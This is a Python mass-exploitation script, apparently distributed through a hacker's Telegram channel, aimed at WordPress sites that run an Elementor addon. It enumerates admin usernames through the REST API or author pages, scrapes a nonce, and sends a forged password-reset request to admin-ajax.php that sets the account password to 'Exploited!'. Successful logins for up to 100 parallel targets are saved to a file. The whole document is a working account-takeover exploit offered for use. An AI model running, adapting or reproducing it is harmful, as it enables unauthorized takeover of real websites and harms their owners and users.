import requests, re, sys
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
init(autoreset=True)

#Coded By: RxR HaCkEr
fr  =   Fore.RED
fg  =   Fore.GREEN

banner = '''{}
           
[#] Create By ::
Y88b   d88P 8888888888 8888888b.   .d88888b.   .d88888b. 88888888888 
 Y88b d88P        d88P 888   Y88b d88P" "Y88b d88P" "Y88b    888     
  Y88o88P        d88P  888    888 888     888 888     888    888     
   Y888P        d88P   888   d88P 888     888 888     888    888     
   d888b     88888888  8888888P"  888     888 888     888    888     
  d88888b     d88P     888 T88b   888     888 888     888    888     
 d88P Y88b   d88P      888  T88b  Y88b. .d88P Y88b. .d88P    888     
d88P   Y88b d88P       888   T88b  "Y88888P"   "Y88888P"     888
          ############## perv exploit ##############                                                                     		 
	    Telegram Channels => https://t.me/x7seller	     


  x7root :)   

\n'''.format(fr)
print(banner)
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')


headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def URLdomain(site):
	if site.startswith("http://") :
		site = site.replace("http://","")
	elif site.startswith("https://") :
		site = site.replace("https://","")
	else :
		pass
	pattern = re.compile('(.*)/')
	while re.findall(pattern,site):
		sitez = re.findall(pattern,site)
		site = sitez[0]
	return site



def wpjson(hosts):
	try:
	

		
		domain = "https://" + URLdomain(hosts)
		
		url = domain + '/wp-json/wp/v2/users/1'
		
		source = requests.get(url, headers=headers,verify=False)
		if('\/","slug"' in source.text):
			user_slug = re.findall('"name":"(.*?)","url":"',source.content)[0]
			return(user_slug)
		else:
			return(0)
		
	except:
		pass
		
		
		
def author(hosts):
	try:
	

		
		domain = "https://" + URLdomain(hosts)
		
		url = domain + '/?author=1'
		
		source = requests.get(url, headers=headers,verify=False)
		if('/feed/" />' in source.text):
			user_slug = re.findall('/author/(.*?)/feed/" />',source.content)[0]
			if('/"' in user_slug or '"' in user_slug):
				return(0)
			else:
				return(user_slug)
		else:
			return(0)
		
	except:
		pass
	
	


def elementor(hosts,user):
	try:
		

		domain = "https://" + URLdomain(hosts)
		
		url = domain + '/wp-admin/admin-ajax.php'
		
		lets=requests.Session()
		
		source = lets.get(domain, headers=headers, verify=False)
		if('localize' in source.content):
			wpnoce = re.findall('"nonce":"(.*?)","i18n":{"added":',source.content)[0]
			
			#print wpnoce
			
			payload = {
						"action": "login_or_register_user",
						"eael-resetpassword-submit": "true",
						"page_id": "1255",
						"widget_id": "226",
						"eael-resetpassword-nonce": wpnoce,
						"eael-pass1": "Exploited!",
						"eael-pass2": "Exploited!",
						"rp_login": user
					}
			response = lets.post(url, headers=headers, data=payload)
			print(response.content)
			if('{"success":true,"data":{"message":"' in response.content):
				print(("Target:{} {} Success Vulnerability ").format(domain, fg))
				open('Success.txt','a').write(domain + "/wp-login.php#" + user + "@Exploited!" + "\n")
				
			else:
				print(("Target:{} {} Not Vulnerability ").format(domain, fr))
				open('bad.txt','a').write(domain + "\n")
				
		else:
			print(("Target:{} {} Not Vulnerability ").format(domain, fr))
		
	except:
		pass
	
def checkVuln(url):
	try:
		wpuser = wpjson(url)
		if(wpuser != 0):
			elementor(url,wpuser)
			
		else:
			wpauthor=author(url)

			if(wpauthor != 0):
				elementor(url,wpauthor)
				
			else:
				elementor(url,'admin')
			
		
	except:
		pass
		
mp = Pool(100)
mp.map(checkVuln, target)
mp.close()
mp.join()